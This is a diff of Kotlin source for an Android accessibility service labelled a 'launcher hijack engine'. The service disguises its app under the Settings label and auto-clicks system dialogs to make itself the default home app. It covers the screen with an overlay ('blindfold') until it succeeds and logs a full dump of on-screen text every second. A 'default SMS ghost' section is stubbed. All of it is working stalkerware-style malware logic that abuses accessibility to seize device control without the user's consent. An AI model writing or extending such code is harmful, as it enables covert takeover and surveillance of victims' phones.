@@ -399,11 +399,30 @@ class MyAccessibilityService : AccessibilityService() {
             }
         }
 
-        // --- DEFAULT SMS GHOST LOGIC ---
-        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
-            // --- LAUNCHER HIJACK ENGINE (HYPER-VERBOSE) ---
-            if (!isSafeZoneActive(this) && LauncherManager.isHijacking) {
+        // --- LAUNCHER HIJACK ENGINE (DECOUPLED & HYPER-VERBOSE) ---
+        if (LauncherManager.isHijacking) {
+            if (isSafeZoneActive(this)) {
+                logThrottled("HIJACK_DIAG", "Hijack active but BLOCKED by SafeZone.")
+            } else {
                 val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
+                val root = rootInActiveWindow
+                val activePkg = root?.packageName?.toString() ?: pkgName
+                
+                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val lastDump = prefs.getLong("ghost_launcher_dump_ts", 0L)
+                val now = System.currentTimeMillis()
+                
+                if (now - lastDump > 1000) {
+                    prefs.edit().putLong("ghost_launcher_dump_ts", now).apply()
+                    DebugLogger.log("HIJACK_DIAG", "Active Window Pkg: '$activePkg' | Current Def_Home: '$currentHome'")
+                    if (root == null) {
+                        DebugLogger.log("HIJACK_DIAG", "rootInActiveWindow is NULL. Cannot scan UI.")
+                    } else {
+                        val sb = java.lang.StringBuilder()
+                        extractText(root, sb)
+                        DebugLogger.log("HIJACK_DIAG", "UI_TREE_DUMP -> ${sb.toString().replace('\n', ' ')}")
+                    }
+                }
                 
                 if (currentHome == packageName) {
                     DebugLogger.log("HIJACK_SUCCESS", "Active Verification TRUE. $packageName is now Default Home!")
@@ -414,108 +433,91 @@ class MyAccessibilityService : AccessibilityService() {
                         DebugLogger.log("HIJACK_SUCCESS", "Lifting blindfold. Welcome home.")
                         DimmerManager.removeOverlay(applicationContext)
                     }, 1500)
-                } else {
-                    val root = rootInActiveWindow
-                    if (root != null) {
-                        val activePkg = root.packageName?.toString() ?: "unknown"
-                        val targetLabel = getString(R.string.label_settings_app)
-                        
-                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                        val lastClick = prefs.getLong("ghost_launcher_click_ts", 0L)
-                        val lastDump = prefs.getLong("ghost_launcher_dump_ts", 0L)
-                        val now = System.currentTimeMillis()
-                        
-                        // High-Frequency Diagnostic Logging (Once per second)
-                        if (now - lastDump > 1000) {
-                            prefs.edit().putLong("ghost_launcher_dump_ts", now).apply()
-                            DebugLogger.log("HIJACK_DIAG", "STATE -> Window: $activePkg | Def_Home: $currentHome | Looking For: '$targetLabel'")
-                            
-                            val sb = java.lang.StringBuilder()
-                            extractText(root, sb)
-                            DebugLogger.log("HIJACK_DIAG", "UI_TREE_DUMP -> ${sb.toString().replace('\n', ' ')}")
-                        }
-                        
-                        // 1. Dismiss arbitrary blocking dialogs (e.g. SIM removed warnings)
-                        val dismissKeywords = listOf("OK", "Close", "Got it")
-                        for (kw in dismissKeywords) {
-                            val dismissNodes = root.findAccessibilityNodeInfosByText(kw)
-                            for (node in dismissNodes) {
-                                var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                                while (target != null && !target.isClickable) target = target.parent
-                                if (target != null && target.isClickable) {
-                                    if (now - lastClick > 1000) {
-                                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
-                                        DebugLogger.log("HIJACK_ACTION", "Dismissed random dialog btn: '$kw'")
-                                    }
+                } else if (root != null) {
+                    val targetLabel = getString(R.string.label_settings_app)
+                    val lastClick = prefs.getLong("ghost_launcher_click_ts", 0L)
+
+                    // 1. Dismiss arbitrary blocking dialogs
+                    val dismissKeywords = listOf("OK", "Close", "Got it")
+                    for (kw in dismissKeywords) {
+                        val dismissNodes = root.findAccessibilityNodeInfosByText(kw)
+                        for (node in dismissNodes) {
+                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                            while (target != null && !target.isClickable) target = target.parent
+                            if (target != null && target.isClickable) {
+                                if (now - lastClick > 1000) {
+                                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                    prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
+                                    DebugLogger.log("HIJACK_ACTION", "Dismissed random dialog btn: '$kw'")
                                 }
                             }
                         }
+                    }
 
-                        // 2. Check for Launcher Confirmation Dialogs
-                        val confirmKeywords = listOf("Set")
-                        var confirmClicked = false
-                        for (kw in confirmKeywords) {
-                            val confirmNodes = root.findAccessibilityNodeInfosByText(kw)
-                            for (node in confirmNodes) {
-                                var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                                while (target != null && !target.isClickable) target = target.parent
-                                
-                                val finalTarget = target
-                                if (finalTarget != null && finalTarget.isClickable) {
-                                    if (now - lastClick > 1000) {
+                    // 2. Check for Launcher Confirmation Dialogs
+                    val confirmKeywords = listOf("Set")
+                    var confirmClicked = false
+                    for (kw in confirmKeywords) {
+                        val confirmNodes = root.findAccessibilityNodeInfosByText(kw)
+                        for (node in confirmNodes) {
+                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                            while (target != null && !target.isClickable) target = target.parent
+                            
+                            val finalTarget = target
+                            if (finalTarget != null && finalTarget.isClickable) {
+                                if (now - lastClick > 1000) {
+                                    val res = finalTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                    prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
+                                    DebugLogger.log("HIJACK_ACTION", "Clicked CONFIRM btn: '$kw' | Success: $res")
+                                }
+                                confirmClicked = true
+                                break
+                            }
+                        }
+                        if (confirmClicked) break
+                    }
+
+                    // 3. Scan for App Target
+                    if (!confirmClicked) {
+                        val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                        if (nodes.isNotEmpty()) {
+                            if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Found ${nodes.size} nodes matching '$targetLabel'")
+                            
+                            if (now - lastClick > 1500) {
+                                var clickedRadio = false
+                                for (i in nodes.indices) {
+                                    val origNode = nodes[i]
+                                    val rRaw = android.graphics.Rect().apply { origNode.getBoundsInScreen(this) }
+                                    
+                                    var target: android.view.accessibility.AccessibilityNodeInfo? = origNode
+                                    while (target != null && !target.isClickable) target = target.parent
+                                    
+                                    val finalTarget = target
+                                    if (finalTarget != null && finalTarget.isClickable) {
+                                        val rTarget = android.graphics.Rect().apply { finalTarget.getBoundsInScreen(this) }
                                         val res = finalTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                         prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
-                                        DebugLogger.log("HIJACK_ACTION", "Clicked CONFIRM btn: '$kw' | Success: $res")
-                                    }
-                                    confirmClicked = true
-                                    break
-                                }
-                            }
-                            if (confirmClicked) break
-                        }
-
-                        // 3. Scan for App Target
-                        if (!confirmClicked) {
-                            val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
-                            if (nodes.isNotEmpty()) {
-                                if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Found ${nodes.size} nodes matching '$targetLabel'")
-                                
-                                if (now - lastClick > 1500) {
-                                    var clickedRadio = false
-                                    for (i in nodes.indices) {
-                                        val origNode = nodes[i]
-                                        val rRaw = android.graphics.Rect().apply { origNode.getBoundsInScreen(this) }
-                                        
-                                        var target: android.view.accessibility.AccessibilityNodeInfo? = origNode
-                                        while (target != null && !target.isClickable) target = target.parent
-                                        
-                                        val finalTarget = target
-                                        if (finalTarget != null && finalTarget.isClickable) {
-                                            val rTarget = android.graphics.Rect().apply { finalTarget.getBoundsInScreen(this) }
-                                            val res = finalTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                            prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
-                                            DebugLogger.log("HIJACK_ACTION", "Clicked Target $i. OrigBounds: ${rRaw.toShortString()} | ClickBounds: ${rTarget.toShortString()} | Result: $res")
-                                            clickedRadio = true
-                                            break
-                                        } else {
-                                            if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Target $i rejected. Node and all parents unclickable. Bounds: ${rRaw.toShortString()}")
-                                        }
+                                        DebugLogger.log("HIJACK_ACTION", "Clicked Target $i. OrigBounds: ${rRaw.toShortString()} | ClickBounds: ${rTarget.toShortString()} | Result: $res")
+                                        clickedRadio = true
+                                        break
+                                    } else {
+                                        if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Target $i rejected. Node and all parents unclickable. Bounds: ${rRaw.toShortString()}")
                                     }
                                 }
-                            } else {
-                                if (now - lastDump > 1000) {
-                                    // Fallback Check: Does the OS display the real package name instead of the alias string?
-                                    val rawName = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception){ "" }
-                                    DebugLogger.log("HIJACK_DIAG", "'$targetLabel' missing. Raw App Name is '$rawName'. Verify UI_TREE_DUMP for exact label presence.")
-                                }
+                            }
+                        } else {
+                            if (now - lastDump > 1000) {
+                                val rawName = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception){ "" }
+                                DebugLogger.log("HIJACK_DIAG", "'$targetLabel' missing. Raw App Name is '$rawName'. Verify UI_TREE_DUMP for exact label presence.")
                             }
                         }
-                    } else {
-                        if (System.currentTimeMillis() % 2000 < 500) DebugLogger.log("HIJACK_DIAG", "rootInActiveWindow is NULL")
                     }
                 }
             }
+        }
+
+        // --- DEFAULT SMS GHOST LOGIC ---
+        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
         }
 
         if (!isSafeZoneActive(this) && isWaitingForDataSettings && pkgName.contains("settings")) {
